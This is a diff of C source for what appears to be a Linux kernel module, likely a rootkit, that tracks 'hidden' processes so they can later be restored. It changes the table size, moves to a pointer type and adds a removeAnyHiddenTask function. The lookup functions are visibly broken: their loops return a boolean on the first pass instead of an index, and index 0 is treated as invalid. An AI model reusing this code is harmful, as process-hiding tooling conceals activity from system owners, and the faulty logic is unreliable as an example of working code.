@@ -2,7 +2,7 @@
 #include "HiddenProcessCollection.h"
 #include "messagesToUser.h"
 
-#define MAXIMUM_NUMBER_OF_ENTRIES 100
+#define MAXIMUM_NUMBER_OF_ENTRIES 50
 
 #define NO_ENTRIES_AVAILABLE -1
 #define NOT_FOUND -1
@@ -12,7 +12,7 @@ static int getIndexOfFreeSpot(HiddenProcessCollection collection);
 //TODO: improve the efficiency of this
 
 struct entry {
-	struct restorableHiddenTask restorableHiddenTask;
+	RestorableHiddenTask restorableHiddenTask;
 	int isInUse;
 };
 
@@ -27,6 +27,8 @@ HiddenProcessCollection createHiddenProcessCollection(void) {
 	if (result == NULL) {
 		return NULL;
 	}
+
+	// isInUse is set to 0 due to use of kcalloc
 
 	return result;
 }
@@ -59,7 +61,7 @@ static int getIndexOfEntryWithPid(HiddenProcessCollection collection, int pid) {
 	int i;
 	for (i = 0; i < MAXIMUM_NUMBER_OF_ENTRIES; i++) {
 		struct entry *entry = getEntry(collection, i);
-		return entry->restorableHiddenTask.pidNumber == pid;
+		return entry->isInUse && entry->restorableHiddenTask->pidNumber == pid;
 	}
 	return NOT_FOUND;
 }
@@ -68,18 +70,19 @@ int isPidInCollection(HiddenProcessCollection collection, int pid) {
 	return getIndexOfEntryWithPid(collection, pid) != NOT_FOUND;
 }
 
-static struct restorableHiddenTask removeEntry(HiddenProcessCollection collection, int index) {
-	struct restorableHiddenTask result = {0};
+static RestorableHiddenTask removeEntry(HiddenProcessCollection collection, int index) {
+	struct entry *entry;
 	if (index <= 0) {
 		printError("attempting to remove an entry that does not exist");
-	} else {
-		struct entry *entry = getEntry(collection, index);
-		result = entry->restorableHiddenTask;
-		entry->isInUse = 0;
+		return NULL;
 	}
-	return result;
+
+	entry = getEntry(collection, index);
+	entry->isInUse = 0;
+	return entry->restorableHiddenTask;
 }
-struct restorableHiddenTask removePidFromCollection(HiddenProcessCollection collection, int pid) {
+
+RestorableHiddenTask removePidFromCollection(HiddenProcessCollection collection, int pid) {
 	int index = getIndexOfEntryWithPid(collection, pid);
 	return removeEntry(collection, index);
 }
@@ -88,7 +91,7 @@ static int getIndexOfEntryWithTask(HiddenProcessCollection collection, void *tas
 	int i;
 	for (i = 0; i < MAXIMUM_NUMBER_OF_ENTRIES; i++) {
 		struct entry *entry = getEntry(collection, i);
-		return entry->restorableHiddenTask.task == task;
+		return entry != NULL && entry->restorableHiddenTask->task == task;
 	}
 	return NOT_FOUND;
 }
@@ -97,15 +100,20 @@ int isTaskInCollection(HiddenProcessCollection collection, void *task) {
 	return getIndexOfEntryWithTask(collection, task) != NOT_FOUND;
 }
 
-struct restorableHiddenTask removeTaskFromCollection(HiddenProcessCollection collection, void *task) {
+RestorableHiddenTask removeTaskFromCollection(HiddenProcessCollection collection, void *task) {
 	int index = getIndexOfEntryWithTask(collection, task);
 	return removeEntry(collection, index);
 }
 
-void addHiddenProcessToCollection(HiddenProcessCollection collection, struct restorableHiddenTask restorableHiddenTask) {
+void addHiddenProcessToCollection(HiddenProcessCollection collection, RestorableHiddenTask restorableHiddenTask) {
 	int index = getIndexOfFreeSpot(collection);
 	if (index <= 0) {
 		printError("failed to hidden process to collection as it was full. This should have been checked earlier\n");
+		return;
+	}
+
+	if (restorableHiddenTask == NULL) {
+		printError("Attempt to add null restorable task\n");
 		return;
 	}
 
@@ -118,4 +126,27 @@ void addHiddenProcessToCollection(HiddenProcessCollection collection, struct res
 
 void destoryHiddenProcessCollection(HiddenProcessCollection collection) {
 	kfree(collection);
+}
+
+static int getIndexOfAnyTaskThatIsHidden(HiddenProcessCollection collection) {
+	int i;
+	for (i = 0; i < MAXIMUM_NUMBER_OF_ENTRIES; i++) {
+		struct entry *entry = getEntry(collection, i);
+		if (entry->isInUse) {
+			return i;
+		}
+	}
+	return NOT_FOUND;
+}
+
+RestorableHiddenTask removeAnyHiddenTask(HiddenProcessCollection collection) {
+	int index = getIndexOfAnyTaskThatIsHidden(collection);
+
+	RestorableHiddenTask result;
+	if (index != NOT_FOUND) {
+		result = removeEntry(collection, index);
+	} else {
+		result = NULL;
+	}
+	return result;
 }
